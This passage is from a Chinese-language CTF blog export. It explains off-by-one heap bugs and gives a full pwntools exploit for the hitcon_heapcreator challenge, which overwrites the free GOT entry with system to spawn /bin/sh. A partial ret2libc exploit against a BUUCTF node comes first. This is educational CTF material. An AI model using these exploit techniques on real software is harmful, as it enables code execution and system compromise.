class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *<br><br><span class=\"hljs-comment\"># p = process(&#x27;./pwn&#x27;)</span><br>p = remote(<span class=\"hljs-string\">&#x27;node4.buuoj.cn&#x27;</span>,<span class=\"hljs-number\">28818</span>)<br>e = ELF(<span class=\"hljs-string\">&#x27;./pwn&#x27;</span>)<br><br><span class=\"hljs-comment\">#payload 1</span><br>payload1 = <span class=\"hljs-string\">&#x27;\\x00&#x27;</span> + <span class=\"hljs-string\">&#x27;\\xff&#x27;</span> * <span class=\"hljs-number\">7</span><br>p.sendline(payload1)<br>p.recvuntil(<span class=\"hljs-string\">&quot;Correct\\n&quot;</span>)<br><br><span class=\"hljs-comment\">#payload 2</span><br>payload2 = (<span class=\"hljs-number\">231</span> + <span class=\"hljs-number\">4</span>) * <span class=\"hljs-string\">b&#x27;a&#x27;</span> + p32(e.plt[<span class=\"hljs-string\">&#x27;write&#x27;</span>]) + p32(<span class=\"hljs-number\">0x08048825</span>) +p32(<span class=\"hljs-number\">1</span>) + p32(e.got[<span class=\"hljs-string\">&#x27;write&#x27;</span>]) + p32(<span class=\"hljs-number\">4</span>)<br><br>p.sendline(payload2)<br><br><span class=\"hljs-comment\"># leak addr</span><br>write_got = u32(p.recv(<span class=\"hljs-number\">4</span>))<br><span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">hex</span>(write_got))<br><br><span class=\"hljs-comment\">#payload 3</span><br>libc = ELF(<span class=\"hljs-string\">&quot;./libc-2.23.so&quot;</span>)<br>libc.address =  write_got - libc.sym[<span class=\"hljs-string\">&#x27;write&#x27;</span>]<br>system = libc.sym[<span class=\"hljs-string\">&quot;system&quot;</span>]<br>binsh = <span class=\"hljs-built_in\">next</span>(libc.search(<span class=\"hljs-string\">b&quot;/bin/sh&quot;</span>))<br>p.sendline(payload1)<br>payload3 =  (<span class=\"hljs-number\">231</span> + <span class=\"hljs-number\">4</span>) * <span class=\"hljs-string\">b&#x27;a&#x27;</span> + p32(system) + p32(<span class=\"hljs-number\">0xdeadbeef</span>) + p32(binsh)<br>p.sendline(payload3)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>\n\n"},{"title":"Off-By-One","date":"2022-11-27T11:00:00.000Z","excerpt":"堆中的 off-by-one 漏洞, hitcon_heapcreator exp","_content":"\n#### Off-By-One漏洞如何产生\n\n1. 循环多一次\n\n   ```C\n   x = malloc(10);\n   for(int i=0;i<=10;i++)\n   {\n       x[i] = getchar();\n   }\n   ```\n\n   x的下一个chunk第一个字节被溢出了\n\n2. `strlen`和`strcpy`行为不一致\n\n   ```C\n   if(strlen(buffer)==100)\n   {\n       strcpy(chunk,buffer);\n   }\n   ```\n\n   `strlen`返回值不算结束符'`\\0`，而`strcpy`复制时会把结束符在内的101个字符复制过去\n   \n   \n\n#### hitcon_creator\n\n题目来源\n\n<https://buuoj.cn/challenges#hitcontraining_heapcreator>\n\n##### 1. create\n\n![](/img/off_by_one/1.png)\n\n从上述结构可以推断出heaparray是如下结构\n\n```C\nstruct heaparray_item{\n    int_64   size;\n    char * content;\n}\nstruct heaparray_item * heaparray[10];\n```\n\n\n\n##### 2. edit\n\n```C\nif ( *(&heaparray + v1) )\n{\n    printf(\"Content of heap : \");\n    read_input(*((_QWORD *)*(&heaparray + v1) + 1), *(_QWORD *)*(&heaparray + v1) + 1LL);\n    puts(\"Done !\");\n}\n```\n\n`read_input`读取size+1字节，出现了off_by_one漏洞\n\n可以覆盖下一个chunk的size字段\n\n\n\n##### 漏洞利用\n\n1. 申请三个堆块，大小为0x18,0x10,0x10，加上三次size申请的0x10，一共6个chunk\n\n    ![](/img/off_by_one/2.jpg)\n\n2. 修改0号块，写入`/bin/sh`，然后再溢出`0x81`到下一个chunk的size\n\n   ![](/img/off_by_one/3.jpg)\n\n3. 这时delete chunk 1，会合并到前一个chunk（也就是1的size所在chunk）中\n\n    ![](/img/off_by_one/4.jpg)\n\n    观察bins，发现这个chunk被free到fastbin的0x80节点上（0x20上也有一个chunk是因为delete也会将size释放掉）\n\n    ![](/img/off_by_one/5.jpg)\n\n4. 申请一个新的chunk，将0x80这个块申请出来，因此malloc的大小需要为0x70\n\n    同时，在2号的content位置写入`free@got`\n\n    这时调用show(2)会泄露free的地址\n\n    ![](/img/off_by_one/6.jpg)\n\n5. 泄露libc基址找到system地址\n\n6. `edit(2,p64(system_addr))`时，会修改content指针指向的内容，而content指针被`free@got`替换掉了，所以free的got表被修改成了`system@got`上的地址\n\n7. 然后`delete(0)`时，首先要free掉`heaparray[0].content`上的内容，但是由于free被替换成了system，结果就变成了以content指针为参数调用system函数的情况，而`heaparray[0].content`恰好是之前写过的`/bin/sh`，因此执行了`system('/bin/sh')\n\n   \n\n##### 完整exp\n\n> libcsearcher挑版本为2.23的\n\n```python\nfrom pwn import *\nfrom LibcSearcher import *\nr = process('./heapcreator')\n#r = remote('node4.buuoj.cn',26117)\nelf = ELF('./heapcreator')\n\ndef add(size,content):\n    r.sendlineafter(\"choice :\",'1')\n    r.sendlineafter(\"Heap : \",str(size))\n    r.sendlineafter(\"heap:\",content)\n\ndef edit(idx,content):\n    r.sendlineafter(\"choice :\",'2')\n    r.sendlineafter(\"Index :\",str(idx))\n    r.sendlineafter(\"heap : \",content)\n\ndef show(idx):\n    r.sendlineafter(\"choice :\",'3')\n    r.sendlineafter(\"Index :\",str(idx))\n\ndef delete(idx):\n    r.sendlineafter(\"choice :\",'4')\n    r.sendlineafter(\"Index :\",str(idx))\n\nfree_got = elf.got['free']\n\nadd(0x18,\"MMMM\")\nadd(0x10,\"MMMM\")\nadd(0x10,\"MMMM\")\n#gdb.attach(r)\n\nedit(0,b'/bin/sh\\x00'+p64(0)*2+b'\\x81')\n#gdb.attach(r)\n\ndelete(1)\n#gdb.attach(r)\n\nadd(0x70,p64(1)*8+p64(0x8)+p64(free_got))\nshow(2)\n#gdb.attach(r)\n\nfree_addr = u64(r.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00'))\n\n#libc\nlibc = LibcSearcher('free',free_addr)\noffset = free_addr-libc.dump('free')\nsystem_addr = offset + libc.dump('system')\n\nedit(2,p64(system_addr))\n#gdb.attach(r)\ndelete(0)\n\nr.interactive()\n```\n\n","source":"_posts/ctf-pwn/Off-By-One.md","raw":"---\ntitle: Off-By-One\ntags: [ctf-pwn,exp]\ndate: 2022-11-27 19:00:00\ncategories: [ctf-pwn]\nexcerpt: 堆中的 off-by-one 漏洞, hitcon_heapcreator exp\n---\n\n#### Off-By-One漏洞如何产生\n\n1. 循环多一次\n\n   ```C\n   x = malloc(10);\n   for(int i=0;i<=10;i++)\n   {\n       x[i] = getchar();\n   }\n   ```\n\n   x的下一个chunk第一个字节被溢出了\n\n2. `strlen`和`strcpy`行为不一致\n\n   ```C\n   if(strlen(buffer)==100)\n   {\n       strcpy(chunk,buffer);\n   }\n   ```\n\n   `strlen`返回值不算结束符'`\\0`，而`strcpy`复制时会把结束符在内的101个字符复制过去\n   \n   \n\n#### hitcon_creator\n\n题目来源\n\n<https://buuoj.cn/challenges#hitcontraining_heapcreator>\n\n##### 1. create\n\n![](/img/off_by_one/1.png)\n\n从上述结构可以推断出heaparray是如下结构\n\n```C\nstruct heaparray_item{\n    int_64   size;\n    char * content;\n}\nstruct heaparray_item * heaparray[10];\n```\n\n\n\n##### 2. edit\n\n```C\nif ( *(&heaparray + v1) )\n{\n    printf(\"Content of heap : \");\n    read_input(*((_QWORD *)*(&heaparray + v1) + 1), *(_QWORD *)*(&heaparray + v1) + 1LL);\n    puts(\"Done !\");\n}\n```\n\n`read_input`读取size+1字节，出现了off_by_one漏洞\n\n可以覆盖下一个chunk的size字段\n\n\n\n##### 漏洞利用\n\n1. 申请三个堆块，大小为0x18,0x10,0x10，加上三次size申请的0x10，一共6个chunk\n\n    ![](/img/off_by_one/2.jpg)\n\n2. 修改0号块，写入`/bin/sh`，然后再溢出`0x81`到下一个chunk的size\n\n   ![](/img/off_by_one/3.jpg)\n\n3. 这时delete chunk 1，会合并到前一个chunk（也就是1的size所在chunk）中\n\n    ![](/img/off_by_one/4.jpg)\n\n    观察bins，发现这个chunk被free到fastbin的0x80节点上（0x20上也有一个chunk是因为delete也会将size释放掉）\n\n    ![](/img/off_by_one/5.jpg)\n\n4. 申请一个新的chunk，将0x80这个块申请出来，因此malloc的大小需要为0x70\n\n    同时，在2号的content位置写入`free@got`\n\n    这时调用show(2)会泄露free的地址\n\n    ![](/img/off_by_one/6.jpg)\n\n5. 泄露libc基址找到system地址\n\n6. `edit(2,p64(system_addr))`时，会修改content指针指向的内容，而content指针被`free@got`替换掉了，所以free的got表被修改成了`system@got`上的地址\n\n7. 然后`delete(0)`时，首先要free掉`heaparray[0].content`上的内容，但是由于free被替换成了system，结果就变成了以content指针为参数调用system函数的情况，而`heaparray[0].content`恰好是之前写过的`/bin/sh`，因此执行了`system('/bin/sh')\n\n   \n\n##### 完整exp\n\n> libcsearcher挑版本为2.23的\n\n```python\nfrom pwn import *\nfrom LibcSearcher import *\nr = process('./heapcreator')\n#r = remote('node4.buuoj.cn',26117)\nelf = ELF('./heapcreator')\n\ndef add(size,content):\n    r.sendlineafter(\"choice :\",'1')\n    r.sendlineafter(\"Heap : \",str(size))\n    r.sendlineafter(\"heap:\",content)\n\ndef edit(idx,content):\n    r.sendlineafter(\"choice :\",'2')\n    r.sendlineafter(\"Index :\",str(idx))\n    r.sendlineafter(\"heap : \",content)\n\ndef show(idx):\n    r.sendlineafter(\"choice :\",'3')\n    r.sendlineafter(\"Index :\",str(idx))\n\ndef delete(idx):\n    r.sendlineafter(\"choice :\",'4')\n    r.sendlineafter(\"Index :\",str(idx))\n\nfree_got = elf.got['free']\n\nadd(0x18,\"MMMM\")\nadd(0x10,\"MMMM\")\nadd(0x10,\"MMMM\")\n#gdb.attach(r)\n\nedit(0,b'/bin/sh\\x00'+p64(0)*2+b'\\x81')\n#gdb.attach(r)\n\ndelete(1)\n#gdb.attach(r)\n\nadd(0x70,p64(1)*8+p64(0x8)+p64(free_got))\nshow(2)\n#gdb.attach(r)\n\nfree_addr = u64(r.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00'))\n\n#libc\nlibc = LibcSearcher('free',free_addr)\noffset = free_addr-libc.dump('free')\nsystem_addr = offset + libc.dump('system')\n\nedit(2,p64(system_addr))\n#gdb.attach(r)\ndelete(0)\n\nr.interactive()\n```\n\n","slug":"ctf-pwn/Off-By-One","published":1,"updated":"2022-12-23T08:29:40.435Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clc0969ga000178ufhstk3oeu","content":"<h4 id=\"Off-By-One漏洞如何产生\"><a href=\"#Off-By-One漏洞如何产生\" class=\"headerlink\" title=\"Off-By-One漏洞如何产生\"></a>Off-By-One漏洞如何产生</h4><ol>\n<li><p>循环多一次</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\">x = <span class=\"hljs-built_in\">malloc</span>(<span class=\"hljs-number\">10</span>);<br><span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> i=<span class=\"hljs-number\">0</span>;i&lt;=<span class=\"hljs-number\">10</span>;i++)<br>&#123;<br>    x[i] = getchar();<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>x的下一个chunk第一个字节被溢出了</p>\n</li>\n<li><p><code>strlen</code>和<code>strcpy</code>行为不一致</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\"><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-built_in\">strlen</span>(buffer)==<span class=\"hljs-number\">100</span>)<br>&#123;<br>    <span class=\"hljs-built_in\">strcpy</span>(chunk,buffer);<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p><code>strlen</code>返回值不算结束符’<code>\\0</code>，而<code>strcpy</code>复制时会把结束符在内的101个字符复制过去</p>\n</li>\n</ol>\n<h4 id=\"hitcon-creator\"><a href=\"#hitcon-creator\" class=\"headerlink\" title=\"hitcon_creator\"></a>hitcon_creator</h4><p>题目来源</p>\n<p><a href=\"https://buuoj.cn/challenges#hitcontraining_heapcreator\">https://buuoj.cn/challenges#hitcontraining_heapcreator</a></p>\n<h5 id=\"1-create\"><a href=\"#1-create\" class=\"headerlink\" title=\"1. create\"></a>1. create</h5><p><img src=\"/img/off_by_one/1.png\"></p>\n<p>从上述结构可以推断出heaparray是如下结构</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\"><span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">heaparray_item</span>&#123;</span><br>    int_64   size;<br>    <span class=\"hljs-type\">char</span> * content;<br>&#125;<br><span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">heaparray_item</span> * <span class=\"hljs-title\">heaparray</span>[10];</span><br></code></pre></td></tr></table></figure>\n\n\n\n<h5 id=\"2-edit\"><a href=\"#2-edit\" class=\"headerlink\" title=\"2. edit\"></a>2. edit</h5><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\"><span class=\"hljs-keyword\">if</span> ( *(&amp;heaparray + v1) )<br>&#123;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Content of heap : &quot;</span>);<br>    read_input(*((_QWORD *)*(&amp;heaparray + v1) + <span class=\"hljs-number\">1</span>), *(_QWORD *)*(&amp;heaparray + v1) + <span class=\"hljs-number\">1LL</span>);<br>    <span class=\"hljs-built_in\">puts</span>(<span class=\"hljs-string\">&quot;Done !&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p><code>read_input</code>读取size+1字节，出现了off_by_one漏洞</p>\n<p>可以覆盖下一个chunk的size字段</p>\n<h5 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h5><ol>\n<li><p>申请三个堆块，大小为0x18,0x10,0x10，加上三次size申请的0x10，一共6个chunk</p>\n<p> <img src=\"/img/off_by_one/2.jpg\"></p>\n</li>\n<li><p>修改0号块，写入<code>/bin/sh</code>，然后再溢出<code>0x81</code>到下一个chunk的size</p>\n<p><img src=\"/img/off_by_one/3.jpg\"></p>\n</li>\n<li><p>这时delete chunk 1，会合并到前一个chunk（也就是1的size所在chunk）中</p>\n<p> <img src=\"/img/off_by_one/4.jpg\"></p>\n<p> 观察bins，发现这个chunk被free到fastbin的0x80节点上（0x20上也有一个chunk是因为delete也会将size释放掉）</p>\n<p> <img src=\"/img/off_by_one/5.jpg\"></p>\n</li>\n<li><p>申请一个新的chunk，将0x80这个块申请出来，因此malloc的大小需要为0x70</p>\n<p> 同时，在2号的content位置写入<code>free@got</code></p>\n<p> 这时调用show(2)会泄露free的地址</p>\n<p> <img src=\"/img/off_by_one/6.jpg\"></p>\n</li>\n<li><p>泄露libc基址找到system地址</p>\n</li>\n<li><p><code>edit(2,p64(system_addr))</code>时，会修改content指针指向的内容，而content指针被<code>free@got</code>替换掉了，所以free的got表被修改成了<code>system@got</code>上的地址</p>\n</li>\n<li><p>然后<code>delete(0)</code>时，首先要free掉<code>heaparray[0].content</code>上的内容，但是由于free被替换成了system，结果就变成了以content指针为参数调用system函数的情况，而<code>heaparray[0].content</code>恰好是之前写过的<code>/bin/sh</code>，因此执行了`system(‘/bin/sh’)</p>\n</li>\n</ol>\n<h5 id=\"完整exp\"><a href=\"#完整exp\" class=\"headerlink\" title=\"完整exp\"></a>完整exp</h5><blockquote>\n<p>libcsearcher挑版本为2.23的</p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *<br><span class=\"hljs-keyword\">from</span> LibcSearcher <span class=\"hljs-keyword\">import</span> *<br>r = process(<span class=\"hljs-string\">&#x27;./heapcreator&#x27;</span>)<br><span class=\"hljs-comment\">#r = remote(&#x27;node4.buuoj.cn&#x27;,26117)</span><br>elf = ELF(<span class=\"hljs-string\">&#x27;./heapcreator&#x27;</span>)<br><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">add</span>(<span class=\"hljs-params\">size,content</span>):<br>    r.sendlineafter(<span class=\"hljs-string\">&quot;choice :&quot;</span>,<span class=\"hljs-string\">&#x27;1&#x27;</span>)<br>    r.sendlineafter(<span class=\"hljs-string\">&quot;Heap : &quot;</span>,<span class=\"hljs-built_in\">str</span>(size))<br>    r.sendlineafter(<span class=\"hljs-string\">&quot;heap:&quot;</span>,content)<br><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">edit</span>(<span class=\"hljs-params\">idx,content</span>):<br>    r.sendlineafter(<span class=\"hljs-string\">&quot;choice :&quot;</span>,<span class=\"hljs-string\">&#x27;2&#x27;</span>)<br>    r.sendlineafter(<span class=\"hljs-string\">&quot;Index :&quot;</span>,<span class=\"hljs-built_in\">str</span>(idx))<br>    r.sendlineafter(<span class=\"hljs-string\">&quot;heap : &quot;</span>,content)<br><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">show</span>(<span class=\"hljs-params\">idx</span>):<br>    r.sendlineafter(<span class=\"hljs-string\">&quot;choice :&quot;</span>,<span class=\"hljs-string\">&#x27;3&#x27;</span>)<br>    r.sendlineafter(<span class=\"hljs-string\">&quot;Index :&quot;</span>,<span class=\"hljs-built_in\">str</span>(idx))<br><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">delete</span>(<span class=\"hljs-params\">idx</span>):<br>    r.sendlineafter(<span class=\"hljs-string\">&quot;choice :&quot;</span>,<span class=\"hljs-string\">&#x27;4&#x27;</span>)<br>    r.sendlineafter(<span class=\"hljs-string\">&quot;Index :&quot;</span>,<span class=\"hljs-built_in\">str</span>(idx))<br><br>free_got = elf.got[<span class=\"hljs-string\">&#x27;free&#x27;</span>]<br><br>add(<span class=\"hljs-number\">0x18</span>,<span class=\"hljs-string\">&quot;MMMM&quot;</span>)<br>add(<span class=\"hljs-number\">0x10</span>,<span class=\"hljs-string\">&quot;MMMM&quot;</span>)<br>add(<span class=\"hljs-number\">0x10</span>,<span class=\"hljs-string\">&quot;MMMM&quot;</span>)<br><span class=\"hljs-comment\">#gdb.attach(r)</span><br><br>edit(<span class=\"hljs-number\">0</span>,<span class=\"hljs-string\">b&#x27;/bin/sh\\x00&#x27;</span>+p64(<span class=\"hljs-number\">0</span>)*<span class=\"hljs-number\">2</span>+<span class=\"hljs-string\">b&#x27;\\x81&#x27;</span>)<br><span class=\"hljs-comment\">#gdb.attach(r)</span><br><br>delete(<span class=\"hljs-number\">1</span>)<br><span class=\"hljs-comment\">#gdb.attach(r)</span><br><br>add(<span class=\"hljs-number\">0x70</span>,p64(<span class=\"hljs-number\">1</span>)*<span class=\"hljs-number\">8</span>+p64(<span class=\"hljs-number\">0x8</span>)+p64(free_got))<br>show(<span class=\"hljs-number\">2</span>)<br><span class=\"hljs-comment\">#gdb.attach(r)</span><br><br>free_addr = u64(r.recvuntil(<span class=\"hljs-string\">b&#x27;\\x7f&#x27;</span>)[-<span class=\"hljs-number\">6</span>:].ljust(<span class=\"hljs-number\">8</span>,<span class=\"hljs-string\">b&#x27;\\x00&#x27;</span>))<br><br><span class=\"hljs-comment\">#libc</span><br>libc = LibcSearcher(<span class=\"hljs-string\">&#x27;free&#x27;</span>,free_addr)<br>offset = free_addr-libc.dump(<span class=\"hljs-string\">&#x27;free&#x27;</span>)<br>system_addr = offset + libc.dump(<span class=\"hljs-string\">&#x27;system&#x27;</span>)<br><br>edit(<span class=\"hljs-number\">2</span>,p64(system_addr))<br><span class=\"hljs-comment\">#gdb.attach(r)</span><br>delete(<span class=\"hljs-number\">0</span>)<br><br>r.interactive()<br></code></pre></td></tr></table></figure>\n\n","site":{"data":{}},"more":"<h4 id=\"Off-By-One漏洞如何产生\"><a href=\"#Off-By-One漏洞如何产生\" class=\"headerlink\" title=\"Off-By-One漏洞如何产生\"></a>Off-By-One漏洞如何产生</h4><ol>\n<li><p>循环多一次</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\">x = <span class=\"hljs-built_in\">malloc</span>(<span class=\"hljs-number\">10</span>);<br><span class=\"hljs-keyword\">for</span>(<span class=\"hljs-type\">int</span> i=<span class=\"hljs-number\">0</span>;i&lt;=<span class=\"hljs-number\">10</span>;i++)<br>&#123;<br>    x[i] = getchar();<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>x的下一个chunk第一个字节被溢出了</p>\n</li>\n<li><p><code>strlen</code>和<code>strcpy</code>行为不一致</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\"><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-built_in\">strlen</span>(buffer)==<span class=\"hljs-number\">100</span>)<br>&#123;<br>    <span class=\"hljs-built_in\">strcpy</span>(chunk,buffer);<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p><code>strlen</code>返回值不算结束符’<code>\\0</code>，而<code>strcpy</code>复制时会把结束符在内的101个字符复制过去</p>\n</li>\n</ol>\n<h4 id=\"hitcon-creator\"><a href=\"#hitcon-creator\" class=\"headerlink\" title=\"hitcon_creator\"></a>hitcon_creator</h4><p>题目来源</p>\n<p><a href=\"https://buuoj.cn/challenges#hitcontraining_heapcreator\">https://buuoj.cn/challenges#hitcontraining_heapcreator</a></p>\n<h5 id=\"1-create\"><a href=\"#1-create\" class=\"headerlink\" title=\"1. create\"></a>1. create</h5><p><img src=\"/img/off_by_one/1.png\"></p>\n<p>从上述结构可以推断出heaparray是如下结构</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\"><span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">heaparray_item</span>&#123;</span><br>    int_64   size;<br>    <span class=\"hljs-type\">char</span> * content;<br>&#125;<br><span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">heaparray_item</span> * <span class=\"hljs-title\">heaparray</span>[10];</span><br></code></pre></td></tr></table></figure>\n\n\n\n<h5 id=\"2-edit\"><a href=\"#2-edit\" class=\"headerlink\" title=\"2. edit\"></a>2. edit</h5><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\"><span class=\"hljs-keyword\">if</span> ( *(&amp;heaparray + v1) )<br>&#123;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Content of heap : &quot;</span>);<br>    read_input(*((_QWORD *)*(&amp;heaparray + v1) + <span class=\"hljs-number\">1</span>), *(_QWORD *)*(&amp;heaparray + v1) + <span class=\"hljs-number\">1LL</span>);<br>    <span class=\"hljs-built_in\">puts</span>(<span class=\"hljs-string\">&quot;Done !&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p><code>read_input</code>读取size+1字节，出现了off_by_one漏洞</p>\n<p>可以覆盖下一个chunk的size字段</p>\n<h5 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h5><ol>\n<li><p>申请三个堆块，大小为0x18,0x10,0x10，加上三次size申请的0x10，一共6个chunk</p>\n<p> <img src=\"/img/off_by_one/2.jpg\"></p>\n</li>\n<li><p>修改0号块，写入<code>/bin/sh</code>，然后再溢出<code>0x81</code>到下一个chunk的size</p>\n<p><img src=\"/img/off_by_one/3.jpg\"></p>\n</li>\n<li><p>这时delete chunk 1，会合并到前一个chunk（也就是1的size所在chunk）中</p>\n<p> <img src=\"/img/off_by_one/4.jpg\"></p>\n<p> 观察bins，发现这个chunk被free到fastbin的0x80节点上（0x20上也有一个chunk是因为delete也会将size释放掉）</p>\n<p> <img src=\"/img/off_by_one/5.jpg\"></p>\n</li>\n<li><p>申请一个新的chunk，将0x80这个块申请出来，因此malloc的大小需要为0x70</p>\n<p> 同时，在2号的content位置写入<code>free@got</code></p>\n<p> 这时调用show(2)会泄露free的地址</p>\n<p> <img src=\"/img/off_by_one/6.jpg\"></p>\n</li>\n<li><p>泄露libc基址找到system地址</p>\n</li>\n<li><p><code>edit(2,p64(system_addr))</code>时，会修改content指针指向的内容，而content指针被<code>free@got</code>替换掉了，所以free的got表被修改成了<code>system@got</code>上的地址</p>\n</li>\n<li><p>然后<code>delete(0)</code>时，首先要free掉<code>heaparray[0].content</code>上的内容，但是由于free被替换成了system，结果就变成了以content指针为参数调用system函数的情况，而<code>heaparray[0].content</code>恰好是之前写过的<code>/bin/sh</code>，因此执行了`system(‘/bin/sh’)</p>\n</li>\n</ol>\n<h5 id=\"完整exp\"><a href=\"#完整exp\" class=\"headerlink\" title=\"完整exp\"></a>完整exp</h5><blockquote>\n<p>libcsearcher挑版本为2.23的</p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *<br><span class=\"hljs-keyword\">from</span> LibcSearcher <span class=\"hljs-keyword\">import</span> *<br>r = process(<span 